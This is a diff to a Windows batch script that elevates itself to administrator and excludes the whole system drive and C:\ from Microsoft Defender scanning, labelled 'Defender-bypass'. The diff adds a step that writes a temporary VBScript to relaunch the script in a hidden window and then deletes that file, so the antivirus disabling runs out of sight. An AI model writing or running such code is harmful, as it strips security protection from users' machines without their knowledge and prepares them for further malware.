@@ -1,9 +1,17 @@
-@echo off 
+@echo off
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
+if "%1"=="hidden" goto :hidden
+echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\run_hidden.vbs"
+echo WshShell.Run """" ^& WScript.Arguments(0) ^& """ hidden"", 0 >> "%temp%\run_hidden.vbs"
+echo Set WshShell = Nothing >> "%temp%\run_hidden.vbs"
+cscript //nologo "%temp%\run_hidden.vbs" "%~f0"
+del "%temp%\run_hidden.vbs"
+exit /b
+:hidden
 Powershell -windowstyle hidden Add-MpPreference -ExclusionPath '%systemdrive%'
 echo -----------Defender-bypass------------------------
 Powershell Add-MpPreference -ExclusionPath 'c:\'
